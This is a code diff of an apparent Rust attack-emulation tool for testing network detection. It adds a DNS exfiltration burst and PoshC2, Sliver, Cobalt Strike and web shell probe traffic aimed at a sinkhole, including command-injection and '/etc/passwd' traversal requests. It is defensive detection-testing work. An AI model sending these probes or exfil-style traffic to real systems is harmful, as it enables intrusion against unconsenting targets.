@@ -43,12 +43,12 @@ const STRATUM_MINING_DOMAINS: &[&str] = &[
 ];
 const STRATUM_PORTS: &[u16] = &[3333, 4444];
 const STRATUM_SUBSCRIBE: &str =
-    "{\"id\": 1, \"method\": \"mining.subscribe\", \"params\": [\"signalbench/1.8.1\", null]}\n";
+    "{\"id\": 1, \"method\": \"mining.subscribe\", \"params\": [\"signalbench/1.8.7\", null]}\n";
 const STRATUM_AUTHORIZE: &str =
     "{\"id\": 2, \"method\": \"mining.authorize\", \"params\": [\"signalbench.worker1\", \"x\"]}\n";
 const STRATUM_PING: &str = "{\"id\": 9, \"method\": \"mining.ping\", \"params\": []}\n";
 const STRATUM_CLIENT_VERSION_RESPONSE: &str =
-    "{\"id\": 4, \"result\": \"signalbench/1.8.1\", \"error\": null}\n";
+    "{\"id\": 4, \"result\": \"signalbench/1.8.7\", \"error\": null}\n";
 
 // Unowned domains that require /etc/hosts configuration for safe testing
 const UNOWNED_DOMAINS: &[&str] = &[
@@ -126,6 +126,21 @@ const POSHC2_VARIANTS: [[u8; 40]; 10] = [
      0x40,0xFF,0x0B,0x99,0x74,0x0E,0x09,0xA0,0x2A,0x69,0x87,0x3D,0x91,0x33,0x61,0x9A,
      0xF0,0x3C,0x9B,0x54,0x8D,0x44,0x04,0xD0],
 ];
+
+// JPEG JFIF APP0 header (20 bytes) — real PoshC2 getimgdata() output prefix.
+// Prepended to each 40-byte variant to produce a 1500-byte body matching
+// the real implant's wire format.
+const POSHC2_JPEG_SOI: &[u8] =
+    b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00";
+
+fn poshc2_body(variant: &[u8]) -> Vec<u8> {
+    const TARGET: usize = 1500;
+    let mut body = Vec::with_capacity(TARGET);
+    body.extend_from_slice(POSHC2_JPEG_SOI);
+    body.extend_from_slice(variant);
+    body.extend((0..TARGET - body.len()).map(|_| rand::random::<u8>()));
+    body
+}
 
 /// HTTP C2 framework beacon profile.
 /// Encodes the distinctive headers used by a specific post-exploitation
@@ -1289,7 +1304,7 @@ impl AttackTechnique for TrafficSignaling {
                     writeln!(log_file_handle, "\n### Installed Port Knock Rules:").unwrap();
                     for line in rules.lines() {
                         if line.contains("PORT_KNOCK") {
-                            writeln!(log_file_handle, "→ {line}").unwrap();
+                            writeln!(log_file_handle, "-> {line}").unwrap();
                         }
                     }
                 }
@@ -1783,6 +1798,7 @@ impl AttackTechnique for SuspiciousGitHubToolTransfer {
 // Connects to known C2/malicious domains and IP addresses based on ttp-bench patterns.
 // Generates network telemetry that security products should flag as suspicious.
 
+#[allow(dead_code)]
 pub struct SuspiciousDomainConnections {}
 
 /// Builds a 78-byte dnscat2 DNS tunnelling probe packet.
@@ -1827,6 +1843,65 @@ fn build_cobalt_strike_dns_packet(qtype: u16) -> Vec<u8> {
     pkt.extend_from_slice(&qtype.to_be_bytes()); // QTYPE
     pkt.extend_from_slice(&[0x00, 0x01]); // QCLASS IN
     pkt
+}
+
+// T1048 Exfiltration Over Alternative Protocol -- high-volume DNS burst.
+// Mirrors the Python test client (build_t1048_high_volume_exfil_packet in
+// c2_traffic_test.py): 120 queries at 10 QPS, each carrying 3 x 60-char
+// URL-safe-base64 labels (45 raw bytes each => 135 raw bytes/query), all
+// under t1048.signalbench.sigre.xyz.  120 x 135 = 16,200 bytes encoded,
+// clearing the >15 KB single-domain exfil threshold in ~12 s.
+const T1048_HV_TOTAL_QUERIES: u32 = 120;
+const T1048_HV_QPS: u64 = 10;
+const T1048_HV_RAW_PER_LABEL: usize = 45;
+const T1048_HV_LABELS_PER_QUERY: usize = 3;
+
+/// Builds one T1048 high-volume DNS exfil packet of the form
+/// `<l1>.<l2>.<l3>.t1048.signalbench.sigre.xyz`.
+///
+/// Each of the three leftmost labels is 45 fresh random bytes encoded as
+/// URL-safe base64 -- exactly 60 chars with no padding (45 % 3 == 0) -- so
+/// the QNAME stays within the RFC 1035 63-byte-label / 255-byte-name limits
+/// and the whole packet stays under the 512-byte UDP cap.
+///
+/// `qtype` should be 1 (A record) or 16 (TXT record); `txid` is the DNS
+/// transaction ID.  Returns the wire packet plus the count of raw payload
+/// bytes encoded (T1048_HV_RAW_PER_LABEL * T1048_HV_LABELS_PER_QUERY = 135).
+fn build_t1048_high_volume_exfil_packet(qtype: u16, txid: u16) -> (Vec<u8>, usize) {
+    use rand::Rng;
+    let mut rng = rand::rng();
+
+    let mut pkt: Vec<u8> = Vec::with_capacity(256);
+    pkt.extend_from_slice(&txid.to_be_bytes()); // Transaction ID
+    pkt.extend_from_slice(&[0x01, 0x00]); // Flags: RD=1, QR=0
+    pkt.extend_from_slice(&[0x00, 0x01]); // QDCOUNT = 1
+    pkt.extend_from_slice(&[0x00, 0x00]); // ANCOUNT = 0
+    pkt.extend_from_slice(&[0x00, 0x00]); // NSCOUNT = 0
+    pkt.extend_from_slice(&[0x00, 0x00]); // ARCOUNT = 0
+
+    // Three high-entropy payload labels (45 raw bytes -> 60 base64 chars each).
+    for _ in 0..T1048_HV_LABELS_PER_QUERY {
+        let mut chunk = [0u8; T1048_HV_RAW_PER_LABEL];
+        for b in chunk.iter_mut() {
+            *b = rng.random::<u8>();
+        }
+        let label = B64URL.encode(chunk); // 60 chars, no padding (45 % 3 == 0)
+        pkt.push(label.len() as u8);
+        pkt.extend_from_slice(label.as_bytes());
+    }
+
+    // Fixed zone suffix: t1048.signalbench.sigre.xyz
+    for label in ["t1048", "signalbench", "sigre", "xyz"] {
+        pkt.push(label.len() as u8);
+        pkt.extend_from_slice(label.as_bytes());
+    }
+    pkt.push(0x00); // end of QNAME
+
+    pkt.extend_from_slice(&qtype.to_be_bytes()); // QTYPE
+    pkt.extend_from_slice(&[0x00, 0x01]); // QCLASS IN
+
+    let encoded_bytes = T1048_HV_RAW_PER_LABEL * T1048_HV_LABELS_PER_QUERY;
+    (pkt, encoded_bytes)
 }
 
 /// Formats a Stratum v1 `mining.submit` JSON-RPC line.
@@ -1907,8 +1982,10 @@ impl AttackTechnique for SuspiciousDomainConnections {
                 bidirectional dwell so PA-440 App-ID classifies each session as \
                 stratum-mining. Phase 3 sends an AsyncRAT TLS 1.2 handshake to \
                 sinkhole:8888 (CN=AsyncRAT Server). Phase 4 sends raw UDP/53 DNS probes: \
-                dnscat2 78-byte tunnel init packet and Cobalt Strike QTYPE A/TXT \
-                beacons (sids 45906/45907)."
+                dnscat2 78-byte tunnel init packet, Cobalt Strike QTYPE A/TXT \
+                beacons (sids 45906/45907), and a T1048 high-volume exfil burst \
+                (120 queries, ~16.2 KB encoded in URL-safe-base64 labels under \
+                t1048.signalbench.sigre.xyz at 10 QPS)."
                 .to_string(),
             category: "COMMAND_AND_CONTROL".to_string(),
             parameters: vec![
@@ -1929,7 +2006,7 @@ impl AttackTechnique for SuspiciousDomainConnections {
                 connections to known C2 infrastructure, connections to IP addresses \
                 in threat intelligence feeds, high-entropy domain names, DGA-like patterns, \
                 beaconing behaviour. Crypto miner: outbound TCP to ports 3333/4444 with \
-                Stratum JSON-RPC payload (mining.subscribe, mining.authorize) — classified \
+                Stratum JSON-RPC payload (mining.subscribe, mining.authorize) -- classified \
                 by Palo Alto App-ID as stratum-mining."
                 .to_string(),
             cleanup_support: true,
@@ -2060,7 +2137,7 @@ impl AttackTechnique for SuspiciousDomainConnections {
                     technique_id: self.info().id,
                     success: true,
                     message: format!(
-                        "DRY RUN: Would connect to {} suspicious domains ({} with C2 framework profiles on port 4444, 1 web shell probe, PoshC2 10-variant, Sliver 8-request, CS 6-pattern, Havoc 3-request), run Stratum v1 sessions on {} hosts, AsyncRAT TLS Phase 3, and DNS probes Phase 4 (dnscat2 + CS A/TXT beacons)",
+                        "DRY RUN: Would connect to {} suspicious domains ({} with C2 framework profiles on port 4444, 1 web shell probe, PoshC2 10-variant, Sliver 8-request, CS 6-pattern, Havoc 3-request), run Stratum v1 sessions on {} hosts, AsyncRAT TLS Phase 3, and DNS probes Phase 4 (dnscat2 + CS A/TXT beacons + T1048 ~16.2 KB exfil burst)",
                         suspicious_domains.len(),
                         C2_PROFILED_DOMAINS.len(),
                         STRATUM_MINING_DOMAINS.len()
@@ -2137,6 +2214,7 @@ impl AttackTechnique for SuspiciousDomainConnections {
             println!();
 
             let is_fallback = sinkhole_ip == SAFE_TEST_IP_FALLBACK;
+            let dig_available = crate::utils::is_command_available("dig").await;
 
             for (domain, reason) in &suspicious_domains {
                 // Check if this domain is safe to test
@@ -3350,18 +3428,45 @@ impl AttackTechnique for SuspiciousDomainConnections {
                     }
                 }
 
-                // DNS lookup for additional telemetry (all domains).
-                let dig_result = Command::new("dig")
-                    .args(["+short", "+time=1", "+tries=1", domain])
-                    .output()
-                    .await;
+                // DNS lookup for additional telemetry (all domains). Prefer dig
+                // for the process + query telemetry; when dig is absent fall back
+                // to the system resolver (tokio::net::lookup_host) so the DNS
+                // query — the actual signal — still leaves the host instead of
+                // the lookup silently producing nothing.
+                if dig_available {
+                    let dig_result = Command::new("dig")
+                        .args(["+short", "+time=1", "+tries=1", domain])
+                        .output()
+                        .await;
 
-                if let Ok(output) = dig_result {
-                    let dns_result = String::from_utf8_lossy(&output.stdout);
-                    if !dns_result.trim().is_empty() {
-                        writeln!(log, "DNS: {}", dns_result.trim()).unwrap();
-                    } else {
-                        writeln!(log, "DNS: No resolution").unwrap();
+                    if let Ok(output) = dig_result {
+                        let dns_result = String::from_utf8_lossy(&output.stdout);
+                        if !dns_result.trim().is_empty() {
+                            writeln!(log, "DNS: {}", dns_result.trim()).unwrap();
+                        } else {
+                            writeln!(log, "DNS: No resolution").unwrap();
+                        }
+                    }
+                } else {
+                    match tokio::net::lookup_host(format!("{domain}:0")).await {
+                        Ok(addrs) => {
+                            let ips: Vec<String> = addrs.map(|a| a.ip().to_string()).collect();
+                            if ips.is_empty() {
+                                writeln!(log, "DNS: No resolution (native resolver, dig absent)")
+                                    .unwrap();
+                            } else {
+                                writeln!(
+                                    log,
+                                    "DNS: {} (native resolver, dig absent)",
+                                    ips.join(" ")
+                                )
+                                .unwrap();
+                            }
+                        }
+                        Err(e) => {
+                            writeln!(log, "DNS: lookup failed (native resolver, dig absent): {e}")
+                                .unwrap();
+                        }
                     }
                 }
 
@@ -3845,6 +3950,9 @@ impl AttackTechnique for SuspiciousDomainConnections {
             //                   sid:MALWARE-CNC dnscat2 DNS tunneling initialization
             //   Cobalt Strike:  27-byte QTYPE A beacon (sid:45906) +
             //                   27-byte QTYPE TXT beacon (sid:45907)
+            //   T1048 exfil:    120-query high-volume burst (3 x 60-char
+            //                   URL-safe-base64 labels/query, ~16.2 KB encoded
+            //                   under t1048.signalbench.sigre.xyz at 10 QPS)
 
             println!("\n[T1071-IOC] Phase 4: Malware DNS Probe Simulation");
             println!("{}", "-".repeat(60));
@@ -3920,6 +4028,55 @@ impl AttackTechnique for SuspiciousDomainConnections {
                             debug!("[T1071-IOC] CS DNS TXT send error: {}", e);
                         }
                     }
+
+                    // T1048 Exfiltration Over Alternative Protocol -- high-volume
+                    // DNS burst.  120 queries at 10 QPS, alternating A/TXT, each
+                    // carrying 3 x 60-char URL-safe-base64 labels (135 raw bytes
+                    // encoded per query => 16,200 bytes total), all under
+                    // t1048.signalbench.sigre.xyz.  Clears the >15 KB
+                    // single-domain exfil threshold in ~12 s.  Mirrors the
+                    // Python test client's build_t1048_high_volume_exfil_packet.
+                    let mut hv_sent: u32 = 0;
+                    let mut hv_errors: u32 = 0;
+                    let mut hv_encoded_total: usize = 0;
+                    let hv_delay = Duration::from_millis(1000 / T1048_HV_QPS);
+                    for i in 0..T1048_HV_TOTAL_QUERIES {
+                        let qtype: u16 = if i % 2 == 0 { 1 } else { 16 };
+                        let txid: u16 = 0x1000u16.wrapping_add((i & 0x0FFF) as u16);
+                        let (hv_pkt, encoded) =
+                            build_t1048_high_volume_exfil_packet(qtype, txid);
+                        match sock.send_to(&hv_pkt, &dns_target).await {
+                            Ok(_) => {
+                                hv_sent += 1;
+                                hv_encoded_total += encoded;
+                            }
+                            Err(e) => {
+                                hv_errors += 1;
+                                if hv_errors <= 3 {
+                                    debug!("[T1071-IOC] T1048 HV exfil send error: {}", e);
+                                }
+                            }
+                        }
+                        sleep(hv_delay).await;
+                    }
+                    dns_sent += hv_sent;
+                    writeln!(
+                        log,
+                        "T1048 HV exfil burst: {} queries sent ({} errors), {} bytes \
+                         encoded under t1048.signalbench.sigre.xyz",
+                        hv_sent, hv_errors, hv_encoded_total
+                    )
+                    .unwrap();
+                    info!(
+                        "[T1071-IOC] T1048 HV exfil burst: {} queries, {} bytes encoded \
+                         under t1048.signalbench.sigre.xyz",
+                        hv_sent, hv_encoded_total
+                    );
+                    println!(
+                        "  [-->] T1048 high-volume exfil burst: {} queries, {} bytes \
+                         encoded under t1048.signalbench.sigre.xyz",
+                        hv_sent, hv_encoded_total
+                    );
                 }
                 Err(e) => {
                     writeln!(log, "UDP socket bind: ERROR ({})", e).unwrap();
@@ -3960,7 +4117,7 @@ impl AttackTechnique for SuspiciousDomainConnections {
             println!(
                 "[T1071-IOC] Summary: {} domain connections ({} ok, {} failed, {} skipped) | \
                  {} Stratum attempts ({} connected) | AsyncRAT TLS -> {}:8888 | \
-                 {} DNS probes (dnscat2 + CS A/TXT)",
+                 {} DNS probes (dnscat2 + CS A/TXT + T1048 exfil burst)",
                 connection_count,
                 successful_connections,
                 connection_count - successful_connections,
@@ -3991,7 +4148,7 @@ impl AttackTechnique for SuspiciousDomainConnections {
                 message: format!(
                     "Completed {} domain connections ({} ok, {} failed, {} skipped), \
                      {} Stratum TCP attempts ({} connected), AsyncRAT TLS handshake to {}:8888, \
-                     and {} DNS probes (dnscat2 + CS A/TXT beacons)",
+                     and {} DNS probes (dnscat2 + CS A/TXT beacons + T1048 exfil burst)",
                     connection_count,
                     successful_connections,
                     connection_count - successful_connections,
@@ -4041,6 +4198,2756 @@ impl AttackTechnique for SuspiciousDomainConnections {
             }
 
             info!("[T1071-IOC] Cleanup complete");
+            Ok(())
+        })
+    }
+}
+
+// ============================================================
+// T1071-IOC split: 4 independently executable technique IDs.
+// The old SuspiciousDomainConnections struct remains in this file
+// (pub = no dead_code lint) but is no longer registered in
+// get_all_techniques() in techniques/mod.rs.
+// ============================================================
+
+pub struct SuspiciousDomainsHttp {}
+
+#[async_trait]
+impl AttackTechnique for SuspiciousDomainsHttp {
+    fn info(&self) -> Technique {
+        Technique {
+            id: "T1071-IOC-HTTP".to_string(),
+            name: "Suspicious Domain Connections - HTTP C2 Framework Profiling".to_string(),
+            description: "HTTP C2 framework profiling across 20 suspicious domains via the \
+                sinkhole. Sends framework-fingerprinted HTTP requests: PoshC2 (10 binary-variant \
+                POSTs, SessionID= cookie, /news.php, sid:MALWARE-CNC Win.Trojan.PoshC2), Sliver \
+                (19 requests covering sids 57675-57682 numeric-nonce, Immersive Labs \
+                .woff/.html/.png variants, 8 Razy hex-nonce requests), Cobalt Strike (6 patterns: \
+                sids 63772/65446/300048/54175/54182/56616 + /track Razy beacon), AdaptixC2 BEACON \
+                (POST /uri.php + /endpoint/api, Firefox 20 UA, X-Beacon-Id/X-App-Id headers), \
+                PowerShell Empire (IE11 UA, RoutingPacket session cookie), Mythic \
+                (JhY3Rpb24iOi base64 URI), Havoc (3-request DEADBEEF/B16B00B5 magic-byte \
+                sequence), web shell probes, and standard framework profiles on port 4444."
+                .to_string(),
+            category: "COMMAND_AND_CONTROL".to_string(),
+            parameters: vec![
+                TechniqueParameter {
+                    name: "log_file".to_string(),
+                    description: "Path to save connection log".to_string(),
+                    required: false,
+                    default: Some("/tmp/signalbench_t1071_http.log".to_string()),
+                },
+                TechniqueParameter {
+                    name: "timeout".to_string(),
+                    description: "Connection timeout in seconds".to_string(),
+                    required: false,
+                    default: Some("3".to_string()),
+                },
+            ],
+            detection: "Monitor for: DNS queries to suspicious TLDs (.tk, .ru, .cn), \
+                connections to port 4444 with C2 HTTP fingerprints (PoshC2 SessionID= cookie, \
+                Sliver PHPSESSID+MSIE+?_=, CS auth_token cookie, Havoc DEADBEEF/B16B00B5 binary \
+                POST body, AdaptixC2 X-Beacon-Id header, Empire RoutingPacket cookie, Mythic \
+                JhY3Rpb24iOi base64 URI path)."
+                .to_string(),
+            cleanup_support: true,
+            platforms: vec!["Linux".to_string()],
+            permissions: vec!["user".to_string()],
+            voltron_only: false,
+        }
+    }
+
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
+        Box::pin(async move {
+            let log_file = config
+                .parameters
+                .get("log_file")
+                .cloned()
+                .unwrap_or_else(|| "/tmp/signalbench_t1071_http.log".to_string());
+            let timeout = config
+                .parameters
+                .get("timeout")
+                .and_then(|t| t.parse::<u32>().ok())
+                .unwrap_or(3);
+
+            let suspicious_domains = vec![
+                ("signalbench-c2-test.tk", "Suspicious TLD (.tk)"),
+                ("signalbench-malware.ru", "Suspicious TLD (.ru)"),
+                ("signalbench-backdoor.cn", "Suspicious TLD (.cn)"),
+                ("signalbench-rat.xyz", "Suspicious TLD (.xyz)"),
+                ("signalbench-payload.top", "Suspicious TLD (.top)"),
+                ("xk8f2m9p3q.t1071.signalbench.sigre.xyz", "DGA-like pattern"),
+                ("a1b2c3d4e5f6.t1071.signalbench.sigre.xyz", "DGA-like pattern"),
+                ("q9w8e7r6t5.t1071.signalbench.sigre.xyz", "DGA-like pattern"),
+                ("update.signalbench-services.com", "Update masquerading"),
+                ("cdn.signalbench-delivery.net", "CDN masquerading"),
+                ("api.signalbench-auth.io", "API masquerading"),
+                ("n7v3x8q2z1.t1071.signalbench.sigre.xyz", "DGA-like pattern"),
+                ("k4p9m2r7w5.t1071.signalbench.sigre.xyz", "DGA-like pattern"),
+                ("h6t1s4b8j3.t1071.signalbench.sigre.xyz", "DGA-like pattern"),
+                ("signalbench.onion.link", "Tor proxy pattern"),
+                ("pool.signalbench-mining.com", "Mining pool pattern"),
+                ("stratum.signalbench-crypto.net", "Stratum protocol pattern"),
+                ("signalbench-mythic.pw", "Mythic C2 pattern (.pw TLD)"),
+                ("signalbench-havoc.cc", "Havoc C2 pattern (.cc TLD)"),
+                ("signalbench-empire.net", "PowerShell Empire C2 listener (.net masquerade)"),
+            ];
+
+            let profiles = c2_profiles();
+
+            if dry_run {
+                info!(
+                    "[DRY RUN] T1071-IOC-HTTP: Would connect to {} suspicious domains ({} with C2 profiles)",
+                    suspicious_domains.len(),
+                    C2_PROFILED_DOMAINS.len()
+                );
+                for (domain, reason) in &suspicious_domains {
+                    if let Some(p) = profiles.iter().find(|p| p.domain == *domain) {
+                        info!("[DRY RUN] - {} ({}) [{}]", domain, reason, p.framework);
+                    } else {
+                        info!("[DRY RUN] - {} ({})", domain, reason);
+                    }
+                }
+                return Ok(SimulationResult {
+                    technique_id: "T1071-IOC-HTTP".to_string(),
+                    success: true,
+                    message: format!(
+                        "DRY RUN: Would connect to {} suspicious domains ({} with C2 framework profiles)",
+                        suspicious_domains.len(),
+                        C2_PROFILED_DOMAINS.len()
+                    ),
+                    artifacts: vec![log_file],
+                    cleanup_required: false,
+                });
+            }
+
+            let running_as_root = is_running_as_root();
+            let sinkhole_ip = resolve_sinkhole_ip().await;
+            let mut hosts_modified = false;
+
+            if running_as_root {
+                info!("[T1071-IOC-HTTP] Running as root, adding safe test entries to /etc/hosts");
+                match add_hosts_entries(&sinkhole_ip) {
+                    Ok(added) => {
+                        hosts_modified = added;
+                        if added {
+                            println!("[OK] Added safe test entries to /etc/hosts");
+                        } else {
+                            println!("[OK] Safe test entries already present in /etc/hosts");
+                        }
+                    }
+                    Err(e) => {
+                        error!("[T1071-IOC-HTTP] Failed to add hosts entries: {}", e);
+                        println!("[WARN] Failed to add hosts entries: {}", e);
+                    }
+                }
+            }
+
+            let mut log = File::create(&log_file)
+                .map_err(|e| format!("Failed to create log file: {}", e))?;
+            writeln!(log, "# SignalBench T1071-IOC-HTTP - HTTP C2 Framework Profiling").unwrap();
+            writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
+            writeln!(log, "# Total domains: {}", suspicious_domains.len()).unwrap();
+            writeln!(log, "# Timeout: {} seconds", timeout).unwrap();
+            writeln!(log, "# Running as root: {}", running_as_root).unwrap();
+            writeln!(log, "# --------------------------------------------------------\n").unwrap();
+
+            let mut connection_count = 0;
+            let mut successful_connections = 0;
+            let mut skipped_count = 0;
+            let mut skipped_domains: Vec<&str> = Vec::new();
+
+            println!("\n[T1071-IOC-HTTP] HTTP C2 Framework Profiling");
+            println!("{}", "-".repeat(60));
+            println!("{:<45} REASON", "TARGET");
+            println!("{}", "-".repeat(60));
+            for (domain, reason) in &suspicious_domains {
+                println!("  {:<43} {}", domain, reason);
+            }
+            println!("{}", "-".repeat(60));
+            println!();
+
+            let is_fallback = sinkhole_ip == SAFE_TEST_IP_FALLBACK;
+            let dig_available = crate::utils::is_command_available("dig").await;
+
+            for (domain, reason) in &suspicious_domains {
+                let domain_is_safe = is_safe_domain(domain);
+
+                if !domain_is_safe && !running_as_root {
+                    let resolves_safely =
+                        domain_resolves_to_safe_ip(domain, &sinkhole_ip).await;
+                    if !resolves_safely {
+                        skipped_count += 1;
+                        skipped_domains.push(domain);
+                        println!("[WARN] Skipping: {} (not configured in /etc/hosts)", domain);
+                        writeln!(log, "=== Skipped: {} ===", domain).unwrap();
+                        writeln!(
+                            log,
+                            "Reason: Unowned domain not configured in /etc/hosts"
+                        )
+                        .unwrap();
+                        writeln!(log).unwrap();
+                        continue;
+                    }
+                }
+
+                connection_count += 1;
+                println!("[T1071-IOC-HTTP] Connecting: {} ...", domain);
+                writeln!(log, "=== Connection {} ===", connection_count).unwrap();
+                writeln!(log, "Target: {}", domain).unwrap();
+                writeln!(log, "Reason: {}", reason).unwrap();
+                writeln!(log, "Safe domain: {}", domain_is_safe).unwrap();
+                writeln!(log, "Time: {}", chrono::Local::now()).unwrap();
+
+                if let Some(profile) = profiles.iter().find(|p| p.domain == *domain) {
+                    writeln!(log, "Framework: {}", profile.framework).unwrap();
+                    writeln!(log, "C2 pattern: {}", profile.reason).unwrap();
+
+                    if profile.domain == "cdn.signalbench-delivery.net" {
+                        println!(
+                            "[T1071-IOC-HTTP]   Framework: {} (4 sequential web shell probe requests)",
+                            profile.framework
+                        );
+                        writeln!(
+                            log,
+                            "Mode: web shell probe (4 sequential requests on port 4444)"
+                        )
+                        .unwrap();
+                        let ws_ua = profile.user_agent;
+                        let ws_base = format!("http://{}:4444", sinkhole_ip);
+                        let ws_host_hdr = format!("Host: {}", profile.domain);
+                        type WsProbe = (
+                            &'static str,
+                            &'static str,
+                            Option<&'static str>,
+                            Option<&'static str>,
+                        );
+                        let ws_probes: &[WsProbe] = &[
+                            ("GET", "/uploads/files/shell.php?cmd=id", None, None),
+                            (
+                                "GET",
+                                "/wp-content/plugins/backup/shell.php?z0=QGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgJzAnKTs%3D&z1=Y21k&z2=aWQ%3D",
+                                None,
+                                None,
+                            ),
+                            (
+                                "GET",
+                                "/app/webroot/files/update.aspx?codes=base64&clazz=SolarWinds.Orion&method=TestMethod&args=whoami",
+                                None,
+                                None,
+                            ),
+                            (
+                                "POST",
+                                "/cgi-bin/php.cgi",
+                                Some("cmd=id&passwd=../../../etc/passwd"),
+                                Some("application/x-www-form-urlencoded"),
+                            ),
+                        ];
+                        let mut ws_any_ok = false;
+                        for &(ws_method, ws_path, ws_body, ws_ct) in ws_probes {
+                            let ws_url = format!("{}{}", ws_base, ws_path);
+                            let mut ws_args: Vec<String> = vec![
+                                "-s".to_string(),
+                                "-o".to_string(),
+                                "/dev/null".to_string(),
+                                "-w".to_string(),
+                                "%{http_code},%{time_total},%{remote_ip}".to_string(),
+                                "--max-time".to_string(),
+                                timeout.to_string(),
+                                "--connect-timeout".to_string(),
+                                timeout.to_string(),
+                                "-A".to_string(),
+                                ws_ua.to_string(),
+                                "-X".to_string(),
+                                ws_method.to_string(),
+                                "-H".to_string(),
+                                ws_host_hdr.clone(),
+                            ];
+                            if let Some(ct) = ws_ct {
+                                ws_args.push("-H".to_string());
+                                ws_args.push(format!("Content-Type: {}", ct));
+                            }
+                            if let Some(body) = ws_body {
+                                ws_args.push("--data-raw".to_string());
+                                ws_args.push(body.to_string());
+                            }
+                            ws_args.push(ws_url);
+                            writeln!(log, "Probe: {} {}", ws_method, ws_path).unwrap();
+                            match Command::new("curl").args(&ws_args).output().await {
+                                Ok(output) => {
+                                    let result = String::from_utf8_lossy(&output.stdout);
+                                    let ec = output.status.code().unwrap_or(-1);
+                                    if is_fallback {
+                                        writeln!(log, "Probe: SENT (fallback)").unwrap();
+                                    } else if ec == 0 {
+                                        if !ws_any_ok {
+                                            successful_connections += 1;
+                                            ws_any_ok = true;
+                                        }
+                                        writeln!(
+                                            log,
+                                            "Probe: SUCCESS ({})",
+                                            result.trim()
+                                        )
+                                        .unwrap();
+                                    } else {
+                                        writeln!(log, "Probe: FAILED (ec={})", ec).unwrap();
+                                    }
+                                }
+                                Err(e) => {
+                                    writeln!(log, "Probe: ERROR ({})", e).unwrap();
+                                }
+                            }
+                        }
+                        if is_fallback {
+                            println!(
+                                "  [-->] Web shell probe sent (fallback, 4 requests)"
+                            );
+                        } else if ws_any_ok {
+                            println!("  [OK] Web shell probe complete (4 requests)");
+                        } else {
+                            println!("  [--] Web shell probe failed (4 requests)");
+                        }
+                    } else if profile.domain == "signalbench-backdoor.cn" {
+                        println!(
+                            "[T1071-IOC-HTTP]   Framework: {} (10 binary-variant POST requests)",
+                            profile.framework
+                        );
+                        writeln!(
+                            log,
+                            "Mode: PoshC2 10-variant POST sequence (port 4444)"
+                        )
+                        .unwrap();
+                        let poshc2_host = format!("Host: {}", profile.domain);
+                        let poshc2_url =
+                            format!("http://{}:4444/news.php", sinkhole_ip);
+                        let mut poshc2_any_ok = false;
+                        for (vi, variant_bytes) in POSHC2_VARIANTS.iter().enumerate() {
+                            let session_b64 = B64URL
+                                .encode(&variant_bytes[..16])
+                                .trim_end_matches('=')
+                                .to_string();
+                            let mut poshc2_args: Vec<String> = vec![
+                                "-s".to_string(),
+                                "-o".to_string(),
+                                "/dev/null".to_string(),
+                                "-w".to_string(),
+                                "%{http_code},%{time_total},%{remote_ip}".to_string(),
+                                "--max-time".to_string(),
+                                timeout.to_string(),
+                                "--connect-timeout".to_string(),
+                                timeout.to_string(),
+                                "-X".to_string(),
+                                "POST".to_string(),
+                                "-A".to_string(),
+                                profile.user_agent.to_string(),
+                                "-H".to_string(),
+                                poshc2_host.clone(),
+                                "-H".to_string(),
+                                format!("Cookie: SessionID={}", session_b64),
+                                "-H".to_string(),
+                                "X-Requested-With: XMLHttpRequest".to_string(),
+                                "-H".to_string(),
+                                "Content-Type: application/octet-stream".to_string(),
+                            ];
+                            if let Ok(mut tf) = tempfile::NamedTempFile::new() {
+                                if tf.write_all(&poshc2_body(variant_bytes)).is_ok() {
+                                    let p = tf.path().to_string_lossy().to_string();
+                                    poshc2_args.push("-d".to_string());
+                                    poshc2_args.push(format!("@{}", p));
+                                    poshc2_args.push(poshc2_url.clone());
+                                    writeln!(
+                                        log,
+                                        "PoshC2 variant {}/10 (1500 bytes)",
+                                        vi + 1
+                                    )
+                                    .unwrap();
+                                    match Command::new("curl")
+                                        .args(&poshc2_args)
+                                        .output()
+                                        .await
+                                    {
+                                        Ok(output) => {
+                                            let res =
+                                                String::from_utf8_lossy(&output.stdout);
+                                            let ec =
+                                                output.status.code().unwrap_or(-1);
+                                            if is_fallback {
+                                                writeln!(
+                                                    log,
+                                                    "PoshC2 {}/10: SENT (fallback)",
+                                                    vi + 1
+                                                )
+                                                .unwrap();
+                                            } else if ec == 0 {
+                                                if !poshc2_any_ok {
+                                                    successful_connections += 1;
+                                                    poshc2_any_ok = true;
+                                                }
+                                                writeln!(
+                                                    log,
+                                                    "PoshC2 {}/10: SUCCESS ({})",
+                                                    vi + 1,
+                                                    res.trim()
+                                                )
+                                                .unwrap();
+                                            } else {
+                                                writeln!(
+                                                    log,
+                                                    "PoshC2 {}/10: FAILED (ec={})",
+                                                    vi + 1,
+                                                    ec
+                                                )
+                                                .unwrap();
+                                            }
+                                        }
+                                        Err(e) => {
+                                            writeln!(
+                                                log,
+                                                "PoshC2 {}/10: ERROR ({})",
+                                                vi + 1,
+                                                e
+                                            )
+                                            .unwrap();
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        if is_fallback {
+                            println!(
+                                "  [-->] PoshC2 10-variant POST sequence sent (fallback)"
+                            );
+                        } else if poshc2_any_ok {
+                            println!(
+                                "  [OK] PoshC2 10-variant POST sequence complete"
+                            );
+                        } else {
+                            println!(
+                                "  [--] PoshC2 10-variant POST sequence failed"
+                            );
+                        }
+                        let poshc2_tls_addr = format!("{}:443", sinkhole_ip);
+                        print!(
+                            "  {:<48} ",
+                            "PoshC2 TLS 1.2 cert (CN=P18055077, port 443)"
+                        );
+                        writeln!(
+                            log,
+                            "PoshC2 TLS: target={}",
+                            poshc2_tls_addr
+                        )
+                        .unwrap();
+                        match async_timeout(
+                            Duration::from_secs(u64::from(timeout) + 2),
+                            Command::new("openssl")
+                                .args([
+                                    "s_client",
+                                    "-connect",
+                                    &poshc2_tls_addr,
+                                    "-tls1_2",
+                                    "-brief",
+                                    "-servername",
+                                    "signalbench-backdoor.cn",
+                                ])
+                                .stdin(Stdio::null())
+                                .output(),
+                        )
+                        .await
+                        {
+                            Ok(Ok(output)) => {
+                                let stdout =
+                                    String::from_utf8_lossy(&output.stdout);
+                                let ec = output.status.code().unwrap_or(-1);
+                                let cert_line = stdout
+                                    .lines()
+                                    .find(|l| {
+                                        l.contains("subject")
+                                            || l.contains("CN=")
